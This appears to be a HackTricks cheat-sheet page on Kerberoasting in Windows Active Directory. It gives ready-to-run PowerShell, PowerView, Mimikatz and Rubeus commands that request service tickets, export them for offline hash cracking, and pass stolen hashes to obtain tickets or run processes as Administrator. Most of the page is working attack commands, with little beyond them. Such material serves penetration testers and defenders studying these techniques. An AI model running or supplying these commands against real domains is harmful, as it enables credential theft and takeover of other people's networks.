https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast

> Kerberoasting a technique in which the passwords of service accounts are cracked. Kerberoasting is mainly efficient if user accounts are used as service accounts. A TGS ticket can be requested for this user, where the TGS is encrypted with the NTLM hash of the user's plaintext password. If the service account is a user account created by the administrator, there is a greater chance that this ticket can be cracked, and therefore the password for the service will be determined. This TGS ticket can be cracked offline. Nidem's kerberoast [https://github.com/nidem/kerberoast] repository is used for the attack.
```powershell
# To see existing tickets
klist

# Remove all tickets
klist purge
```

### PowerView
Request a kerberos service ticket for specified SPN.  By default the output is in Hashcat format
```powershell
Request-SPNTicket -SPN "CIFS/target.domain.local" [-OutputFormat JTR]
```
### Manually
By doing it manually, ticket is generated, it requires to be extracted to crack the hash
```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "CIFS/target.domain.local"
```

Dump the tickets out
```text
Invoke-Mimikatz -Command '"kerberos::list /export"'
```

Now, crack ’em
### Over-Pass the Hash
#### Rubeus
```powershell
Rubeus.exe asktgt /user:USER < /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/opsec] /ptt
```
#### Mimikatz
```powershell
sekurlsa::pth /user:Administrator /domain:target.domain.local < /ntlm:hash | /aes256:hash> /run:powershell.exe
```